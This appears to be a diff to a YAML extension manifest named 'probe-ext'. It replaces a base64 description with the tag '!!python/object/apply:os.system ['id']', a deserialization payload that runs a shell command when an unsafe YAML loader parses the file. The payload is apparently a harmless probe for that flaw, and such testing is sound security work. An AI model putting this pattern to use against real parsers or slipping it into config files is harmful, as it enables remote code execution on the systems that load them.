@@ -2,8 +2,7 @@ name: probe-ext
 version: 0.1.0
 specVersion: v1beta
 displayName: x
-description: !!binary |
-  aGVsbG8=
+description: !!python/object/apply:os.system ['id']
 license: Apache-2.0
 author:
   authorName: p
